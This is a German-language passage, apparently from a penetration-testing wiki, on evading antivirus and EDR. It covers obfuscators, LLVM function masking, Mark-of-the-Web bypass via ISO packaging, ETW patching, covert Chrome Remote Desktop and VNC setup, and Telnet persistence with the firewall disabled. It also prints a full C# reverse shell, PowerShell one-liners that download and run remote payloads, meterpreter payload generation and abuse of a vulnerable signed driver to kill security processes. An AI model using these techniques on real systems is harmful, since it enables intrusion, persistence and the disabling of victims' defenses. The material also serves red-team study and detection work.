4.  Manuelle Bereinigung – führe die resultierende Binary in dnSpy aus und suche nach großen Base64-Blobs oder der Verwendung von `RijndaelManaged`/`TripleDESCryptoServiceProvider`, um das *eigentliche* Payload zu finden. Oft speichert die Malware es als TLV-kodiertes Byte-Array, das innerhalb von `<Module>.byte_0` initialisiert wird.

Die obige Kette stellt den Ausführungsfluss wieder her, **ohne** das bösartige Sample ausführen zu müssen – nützlich, wenn du auf einer Offline-Workstation arbeitest.

> 🛈  ConfuserEx erstellt ein benutzerdefiniertes Attribut namens `ConfusedByAttribute`, das als IOC verwendet werden kann, um Samples automatisch zu triagieren.

#### Einzeiler
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```

---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C#-Obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Ziel dieses Projekts ist es, einen Open-Source-Fork der LLVM-Compiler-Suite bereitzustellen, der durch [Code-Obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) und Manipulationsschutz für mehr Softwaresicherheit sorgt.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstriert, wie sich die Sprache `C++11/14` verwenden lässt, um zur Compile-Zeit obfuskierten Code zu generieren, ohne externe Tools zu verwenden oder den Compiler zu verändern.
- [**obfy**](https://github.com/fritzone/obfy): Fügt eine Ebene obfuskierter Operationen hinzu, die mit dem C++-Template-Metaprogrammierungs-Framework generiert werden. Dadurch wird es für Personen, die die Anwendung knacken wollen, etwas schwieriger.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ist ein x64-Binary-Obfuscator, der verschiedene PE-Dateien obfuskieren kann, darunter .exe, .dll und .sys.
- [**metame**](https://github.com/a0rtega/metame): Metame ist eine einfache Engine für metamorphic code in beliebigen ausführbaren Dateien.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ist ein Framework zur feingranularen Code-Obfuscation für von LLVM unterstützte Sprachen, das ROP (return-oriented programming) verwendet. ROPfuscator obfuskiert ein Programm auf Assembly-Ebene, indem reguläre Instruktionen in ROP-Ketten umgewandelt werden. Dadurch wird unsere natürliche Vorstellung eines normalen Kontrollflusses durchkreuzt.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ist ein in Nim geschriebener .NET-PE-Crypter.
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kann vorhandene EXE/DLL-Dateien in Shellcode umwandeln und anschließend laden.

### LLVM-Compiler-gestützte funktionsweise Selbstmaskierung

Anstatt ein ganzes Implant nur während des Schlafens zu maskieren, kann ein modifiziertes LLVM-X86-Backend ausgewählte Funktionen maskiert halten, solange sie inaktiv sind. Der Function-Peekaboo-PoC wählt demangelte Namen aus, die `REG_` enthalten, fügt positionsunabhängige Ein- und Austritts-Stubs um den finalen Maschinencode ein und gibt einen gemeinsam genutzten Maskierungs-Handler in `.text` aus; Signaturen auf Quelltextebene und die Windows-x64-Aufrufkonvention bleiben unverändert.<sup>[[38]](#references)[[39]](#references)</sup>

#### Kontrollfluss-Transformation im Backend

Diese Transformation gehört hinter die Instruktionsauswahl und Optimierung, da sie **jeden ausgegebenen Return** erfassen und das exakte x86-Layout kennen muss. Ein `MachineFunctionPass` vor der Ausgabe findet die letzte `MachineInstr::isReturn()`, löscht sie, damit der letzte Ausführungspfad in den angehängten Epilog fällt, und ersetzt frühere Returns durch `JMP_1 handler`. Compiler-generiertes Stack-/Frame-Teardown vor jedem Return muss erhalten bleiben; umgeleitet wird nur die Return-Instruktion selbst.<sup>[[38]](#references)[[39]](#references)</sup>

`X86AsmPrinter::emitFunctionBodyStart()` und `emitFunctionBodyEnd()` geben die funktionsspezifischen Stubs aus, während `emitEndOfAsmFile()` den Handler ausgibt. Symbole, die zwischen den Ausgabephasen gemeinsam genutzt werden, ermöglichen es einem Prolog-Branch, auf seinen später ausgegebenen Epilog zu verweisen. Für ein manuell ausgegebenes near-`je` werden `0F 84` gefolgt vom vier Byte langen MC-Ausdruck `target - address_after_je` geschrieben. Aufrufe und Sprünge zum Handler können stattdessen als `MCInst`-Objekte ausgegeben werden (`CALL64pcrel32` und `JMP_1`). Ein Pass muss für eine nicht ausgewählte Funktion `false` zurückgeben, wenn er nichts geändert hat; der PoC gibt in diesem Fall fälschlicherweise `true` zurück.<sup>[[38]](#references)[[39]](#references)</sup>

#### Metadaten und Pre-CRT-Initialisierung

Der PoC platziert einen XOR-Schlüssel und 16 Byte große Datensätze in `.funcmeta`, die einen vom Loader relocierten Funktionszeiger sowie eine Laufzeitlänge enthalten. Obwohl das C-Feld ein `uint32_t` ist, greift der Handler am Datensatz-Offset `+8` auf ein QWORD zu, wodurch die Länge und ihr Padding gelesen werden. Die Datensätze werden jeweils um `0x10` weitergeschaltet. PE-Abschnittsnamen sind höchstens acht Byte lang, daher findet die Laufzeitabfrage `.funcmet`. Ein externes Patching-Tool fügt einen ausführbaren Abschnitt `.stub` hinzu, speichert die alte Entry-Point-RVA im Stub und leitet `AddressOfEntryPoint` um. Der PIC-Stub ermittelt die Image-Base über `gs:[0x60]` → `[PEB+0x10]`, durchläuft die PE32+-Imports, um eine bereits importierte `VirtualProtect` aufzulösen, und läuft vor der CRT.<sup>[[38]](#references)[[39]](#references)</sup>

Bei der Initialisierung wird in `gs:[0xE8]` ein Sentinel gesetzt und jede Metadatenfunktion aufgerufen. Ihr dauerhaft lesbarer Prolog speichert den Funktionsanfang in `gs:[0xF0]`, erkennt den Sentinel und überspringt den noch unmaskierten Funktionskörper. Der Epilog verwendet dann `call handler`; nachdem der Handler 13 Register (`0x68` Byte) gesichert hat, enthält die Rücksprungadresse bei `[rsp+0x68]` das Ende der transformierten Funktion. Daher kann `end - start` in den zugehörigen Metadatensatz geschrieben werden. Nachdem alle Funktionskörper maskiert wurden, löscht der Stub den Sentinel und springt zu `ImageBase + original_entry_point_RVA`.<sup>[[38]](#references)[[39]](#references)</sup>

Bei einem normalen Aufruf ruft der Prolog denselben symmetrischen Handler auf, um den Funktionskörper zu dekodieren. Der letzte Ausführungspfad fällt in den angehängten Epilog, während jeder frühere Return direkt zum gemeinsam genutzten Handler springt. Auch der normale Epilog verwendet `jmp handler` statt `call`. Nach der erneuten Maskierung verwendet das `ret` des Handlers so die Rücksprungadresse des ursprünglichen Aufrufers und erhält das Funktionsergebnis in `RAX`.<sup>[[38]](#references)[[39]](#references)</sup>

#### Maskierungsprimitive und Analyseindikatoren

Der Handler findet den aktuellen Datensatz, überspringt den festen sichtbaren Prolog (in diesem Build `0x46` Byte), setzt den Schutz des Rests auf `PAGE_EXECUTE_READWRITE`, XORt jedes Byte mit dem niederwertigen Byte des Schlüssels und setzt den Schutz anschließend auf `PAGE_EXECUTE_READ`. Dieselbe Schleife dekodiert beim Eintritt und kodiert bei jedem regulären Austritt.<sup>[[38]](#references)[[39]](#references)</sup>

Zu den aussagekräftigen Indikatoren für dieses Design gehören:<sup>[[38]](#references)[[39]](#references)</sup>

- ein Entry Point innerhalb eines ausführbaren `.stub` und ein Abschnitt `.funcmet`, der einen Schlüssel sowie relocierte Zeiger auf `.text` enthält;
- das Parsen von PEB, Import- und Abschnittstabellen vor der CRT, gefolgt von Aufrufen über jeden Metadatenzeiger;
- identische PIC-Prologe mit `call`/`pop` und zahlreiche Return-Stellen, die zu einem einzigen Handler umgeleitet werden;
- Schreibzugriffe auf `gs:[0xE8]`, `gs:[0xF0]` und `gs:[0xF8]`, gefolgt von wiederholten `VirtualProtect`-Wechseln und byteweisen XOR-Schreibzugriffen in ausführbare, vom Image unterstützte Speicherseiten.

Dies ist eine Umgehung von Memory-Scannern, kein kryptografischer Schutz: Die gepatchte Datei enthält weiterhin den ursprünglichen unmaskierten Funktionskörper, und ein Debugger kann bei `VirtualProtect` oder der XOR-Schleife anhalten und die aktive Funktion auslesen. Das Single-Byte-XOR, die lesbaren Metadaten und die feste Grenze von `0x46` machen zudem eine Offline-Wiederherstellung unkompliziert.<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> Die TEB-Slots des PoC sind threadlokal, aber die modifizierten Code-Seiten gelten prozessweit. Gleichzeitige oder rekursive Aufrufe können daher Instruktionen erneut umschalten, während ein anderer Aufruf sie ausführt. Auch Exceptions und nichtlokale Sprünge können die erneute Maskierung umgehen. Eine robuste Implementierung muss Übergänge synchronisieren, den über `lpflOldProtect` zurückgegebenen tatsächlichen Schutz wiederherstellen, fest codierte Stub-Längen vermeiden, sowohl `call`- als auch `jmp`-Pfade auf die Stack-Ausrichtung bei x64 prüfen und nach dem Überschreiben ausführbarer Bytes `FlushInstructionCache` aufrufen. Microsoft weist ausdrücklich darauf hin, dass der Aufrufer bei Änderungen an ausführbarem Code für die Kohärenz des Instruktionscaches verantwortlich ist.<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

Möglicherweise haben Sie diesen Bildschirm schon einmal gesehen, wenn Sie ausführbare Dateien aus dem Internet herunterladen und ausführen.

Microsoft Defender SmartScreen ist ein Sicherheitsmechanismus, der Endnutzer davor schützen soll, potenziell schädliche Anwendungen auszuführen.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreen arbeitet hauptsächlich reputationsbasiert. Das bedeutet, dass selten heruntergeladene Anwendungen SmartScreen auslösen und dadurch eine Warnung angezeigt wird, die Endnutzer daran hindert, die Datei auszuführen (die Datei lässt sich jedoch weiterhin über „Weitere Informationen“ -> „Trotzdem ausführen“ starten).

**MoTW** (Mark of The Web) ist ein [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>) mit dem Namen Zone.Identifier, der beim Herunterladen von Dateien aus dem Internet automatisch erstellt wird und die URL enthält, von der die Datei heruntergeladen wurde.

<figure><img src="../images/image (237).png" alt=""><figcaption><p>Überprüfen des Zone.Identifier-ADS für eine aus dem Internet heruntergeladene Datei.</p></figcaption></figure>

> [!TIP]
> Beachten Sie, dass ausführbare Dateien, die mit einem **vertrauenswürdigen** Signaturzertifikat signiert sind, **SmartScreen nicht auslösen**.

Eine sehr effektive Möglichkeit, zu verhindern, dass Ihre Payloads den Mark of The Web erhalten, besteht darin, sie in einen Container wie eine ISO-Datei zu packen. Das liegt daran, dass Mark-of-the-Web (MOTW) **nicht** auf **Nicht-NTFS**-Volumes angewendet werden kann.

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) ist ein Tool, das Payloads in Ausgabecontainern verpackt, um Mark-of-the-Web zu umgehen.

Beispielverwendung:

```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
    +             o     +           +             o     +         +
    o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
   :: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
   for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
    o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
    Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```

Hier ist eine Demo zum Umgehen von SmartScreen, indem Payloads mit [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) in ISO-Dateien verpackt werden.

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) ist ein leistungsfähiger Protokollierungsmechanismus in Windows, mit dem Anwendungen und Systemkomponenten **Ereignisse protokollieren** können. Sicherheitsprodukte können ihn jedoch auch verwenden, um bösartige Aktivitäten zu überwachen und zu erkennen.

Ähnlich wie sich AMSI deaktivieren (umgehen) lässt, kann man auch die Funktion **`EtwEventWrite`** eines User-Space-Prozesses so ändern, dass sie sofort zurückkehrt, ohne Ereignisse zu protokollieren. Dazu wird die Funktion im Speicher so gepatcht, dass sie sofort zurückkehrt und damit die ETW-Protokollierung für diesen Prozess effektiv deaktiviert.

Weitere Informationen findest du unter **[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) und [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)**.<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

C#-Binaries im Speicher zu laden, ist schon seit geraumer Zeit bekannt und nach wie vor eine sehr gute Möglichkeit, deine Post-Exploitation-Tools auszuführen, ohne von AV entdeckt zu werden.

Da die Payload direkt in den Speicher geladen wird, ohne auf die Festplatte zuzugreifen, müssen wir uns nur darum kümmern, AMSI für den gesamten Prozess zu patchen.

Die meisten C2-Frameworks (sliver, Covenant, metasploit, CobaltStrike, Havoc usw.) ermöglichen bereits die direkte Ausführung von C#-Assemblies im Speicher. Dafür gibt es jedoch verschiedene Möglichkeiten:

- **Fork\&Run**

Dabei wird **ein neuer sacrificial process gestartet**, dein bösartiger Post-Exploitation-Code in diesen Prozess injiziert und ausgeführt und der neue Prozess anschließend beendet. Das hat sowohl Vor- als auch Nachteile. Der Vorteil der Fork-and-Run-Methode ist, dass die Ausführung **außerhalb** unseres Beacon-Implant-Prozesses stattfindet. Das bedeutet: Falls bei einer Post-Exploitation-Aktion etwas schiefläuft oder entdeckt wird, ist die **Wahrscheinlichkeit deutlich höher**, dass unser **Implant überlebt**. Der Nachteil ist, dass die **Wahrscheinlichkeit höher ist**, von **verhaltensbasierten Erkennungsverfahren** entdeckt zu werden.

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

Dabei wird der bösartige Post-Exploitation-Code **in den eigenen Prozess** injiziert. So musst du keinen neuen Prozess erstellen, der von AV gescannt werden könnte. Der Nachteil: Falls bei der Ausführung deiner Payload etwas schiefläuft, ist die **Wahrscheinlichkeit deutlich höher**, dass du deinen **Beacon verlierst**, da er abstürzen könnte.

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Wenn du mehr über das Laden von C#-Assemblies erfahren möchtest, lies diesen Artikel [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) und sieh dir den InlineExecute-Assembly BOF an ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)).

Du kannst C#-Assemblies auch **aus PowerShell** laden. Sieh dir [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) und [das Video von S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk) an.

## Andere Programmiersprachen verwenden

Wie in [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) vorgeschlagen, lässt sich bösartiger Code auch in anderen Sprachen ausführen, indem man dem kompromittierten Rechner Zugriff **auf die Interpreter-Umgebung gewährt, die auf der vom Angreifer kontrollierten SMB-Freigabe installiert ist**.

Wenn du Zugriff auf die Interpreter-Binaries und die Umgebung auf der SMB-Freigabe gewährst, kannst du **beliebigen Code in diesen Sprachen im Speicher** des kompromittierten Rechners ausführen.

Im Repository steht: Defender scannt die Skripte weiterhin, aber durch die Verwendung von Go, Java, PHP usw. haben wir **mehr Flexibilität beim Umgehen statischer Signaturen**. Tests mit zufälligen, nicht verschleierten Reverse-Shell-Skripten in diesen Sprachen waren erfolgreich.

## TokenStomping

Token stomping manipuliert das Zugriffstoken eines Sicherheitsprodukts wie EDR oder AV. Werden die Berechtigungen des Tokens verringert, kann der Prozess weiterlaufen, ohne privilegierte Prüfungen oder Abhilfemaßnahmen durchführen zu können.

Um das zu verhindern, könnte Windows **externen Prozessen den Zugriff auf die Tokens** von Sicherheitsprozessen verwehren.

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Vertrauenswürdige Software verwenden

### Chrome Remote Desktop

Wie in [**diesem Blogbeitrag**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) beschrieben, lässt sich Chrome Remote Desktop einfach auf dem PC eines Opfers installieren und anschließend zur Übernahme des PCs und zur Aufrechterhaltung der Persistenz verwenden:<sup>[[35]](#references)</sup>
1. Lade das Programm von https://remotedesktop.google.com/ herunter, klicke auf „Set up via SSH“ und anschließend auf die MSI-Datei für Windows, um sie herunterzuladen.
2. Führe das Installationsprogramm unbemerkt auf dem Rechner des Opfers aus (Administratorrechte erforderlich): `msiexec /i chromeremotedesktophost.msi /qn`
3. Kehre zur Chrome-Remote-Desktop-Seite zurück und klicke auf „Next“. Der Assistent fordert dich dann zur Autorisierung auf. Klicke auf „Authorize“, um fortzufahren.
4. Führe den bereitgestellten Befehl mit den erforderlichen Anpassungen aus: `"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111` (mit dem Parameter `--pin` wird die PIN ohne Verwendung der GUI festgelegt).
 

## Fortgeschrittene Umgehungstechniken

{{#ref}}
virtualized-payload-execution.md
{{#endref}}

Umgehungstechniken sind ein sehr komplexes Thema. Manchmal müssen viele verschiedene Telemetriequellen auf einem einzigen System berücksichtigt werden, daher ist es in ausgereiften Umgebungen praktisch unmöglich, vollständig unentdeckt zu bleiben.

Jede Umgebung, der du gegenüberstehst, hat ihre eigenen Stärken und Schwächen.

Ich empfehle dir dringend, dir diesen Vortrag von [@ATTL4S](https://twitter.com/DaniLJ94) anzusehen, um einen Einstieg in fortgeschrittene Umgehungstechniken zu bekommen.


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

Dies ist ebenfalls ein großartiger Vortrag von [@mariuszbit](https://twitter.com/mariuszbit) über Evasion in Depth.


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Ältere Techniken**

### **Prüfen, welche Teile Defender als bösartig erkennt**

Du kannst [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) verwenden. Das Tool **entfernt Teile des Binaries**, bis es **herausfindet, welchen Teil Defender** als bösartig erkennt, und teilt ihn für dich auf.\
Ein weiteres Tool, das **dasselbe macht, ist** [**avred**](https://github.com/dobin/avred). Es bietet den Dienst öffentlich im Web unter [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/) an.

### **Telnet-Server**

Bis einschließlich Windows 10 enthielten alle Windows-Versionen einen **Telnet-Server**, den du (als Administrator) mit folgendem Befehl installieren konntest:

```bash
pkgmgr /iu:"TelnetServer" /quiet
```

Lass es beim Systemstart **starten** und **führe** es jetzt aus:

```bash
sc config TlntSVR start= auto obj= localsystem
```

**Telnet-Port ändern** (stealth) und Firewall deaktivieren:

```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```

### UltraVNC

Lade es herunter von: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (du brauchst die Bin-Downloads, nicht das Setup)

**AUF DEM HOST**: Führe _**winvnc.exe**_ aus und konfiguriere den Server:

- Aktiviere die Option _Disable TrayIcon_
- Lege unter _VNC Password_ ein Passwort fest
- Lege unter _View-Only Password_ ein Passwort fest

Verschiebe anschließend die Binärdatei _**winvnc.exe**_ und die **neu** erstellte Datei _**UltraVNC.ini**_ auf den **victim**

#### **Reverse connection**

Der **attacker** sollte auf seinem **host** die Binärdatei `vncviewer.exe -listen 5900` **ausführen**, damit sie bereit ist, eine umgekehrte **VNC connection** entgegenzunehmen. Führe dann auf dem **victim** den winvnc-Daemon mit `winvnc.exe -run` aus und starte `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNUNG:** Um unauffällig zu bleiben, darfst du einige Dinge nicht tun:

- Starte `winvnc` nicht, wenn es bereits läuft, da sonst ein [popup](https://i.imgur.com/1SROTTl.png) ausgelöst wird. Prüfe mit `tasklist | findstr winvnc`, ob es läuft.
- Starte `winvnc` nicht ohne `UltraVNC.ini` im selben Verzeichnis, da sonst [das Konfigurationsfenster](https://i.imgur.com/rfMQWcf.png) geöffnet wird.
- Führe `winvnc -h` nicht aus, um die Hilfe aufzurufen, da sonst ein [popup](https://i.imgur.com/oc18wcu.png) ausgelöst wird.

### GreatSCT

Lade es herunter von: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)

```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```

In GreatSCT:

```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```

Starte nun **den Listener** mit `msfconsole -r file.rc` und **führe** die **XML-Payload** mit folgendem Befehl aus:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```

**Der aktuelle Defender beendet den Prozess sehr schnell.**

### Unsere eigene Reverse Shell kompilieren

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Erste C#-Revershell

Kompiliere sie mit:

```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```

Verwenden Sie es mit:

```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);

						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```

### C# mit Compiler

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```

[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

Automatischer Download und Ausführung:

```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```


{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

Liste der C#-Obfuscatoren: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++

```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### Beispiel für die Verwendung von Python zum Erstellen von Injectors:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### Weitere Tools

```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```

### Mehr

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Eigenen verwundbaren Treiber mitbringen (BYOVD) – AV/EDR aus dem Kernel-Modus ausschalten

Storm-2603 nutzte ein kleines Konsolendienstprogramm namens **Antivirus Terminator**, um den Endpunktschutz zu deaktivieren, bevor Ransomware abgelegt wurde. Das Tool bringt **einen eigenen verwundbaren, aber *signierten* Treiber** mit und missbraucht ihn, um privilegierte Kernel-Operationen auszuführen, die selbst Protected-Process-Light-(PPL-)AV-Dienste nicht blockieren können.<sup>[[12]](#references)</sup>

Wichtigste Erkenntnisse
1. **Signierter Treiber**: Die auf die Festplatte übertragene Datei heißt `ServiceMouse.sys`, doch die Binärdatei ist der legitim signierte Treiber `AToolsKrnl64.sys` aus Antiy Labs’ „System In-Depth Analysis Toolkit“. Da der Treiber eine gültige Microsoft-Signatur besitzt, wird er auch bei aktiviertem Driver-Signature-Enforcement (DSE) geladen.
2. **Service-Installation**:
   ```powershell
   sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
   sc start  ServiceMouse
   ```
   Die erste Zeile registriert den Treiber als **Kernel-Dienst**, und die zweite startet ihn, sodass `\\.\ServiceMouse` aus dem Userland zugänglich wird.
3. **Vom Treiber bereitgestellte IOCTLs**
   | IOCTL-Code | Funktion                                |
   |-----------:|-----------------------------------------|
   | `0x99000050` | Beliebigen Prozess anhand der PID beenden (wird verwendet, um Defender-/EDR-Dienste zu beenden) |
   | `0x990000D0` | Beliebige Datei auf der Festplatte löschen |
   | `0x990001D0` | Treiber entladen und Dienst entfernen |

   Minimaler C-Proof-of-Concept:
   ```c
   #include <windows.h>
   
   int main(int argc, char **argv){
       DWORD pid = strtoul(argv[1], NULL, 10);
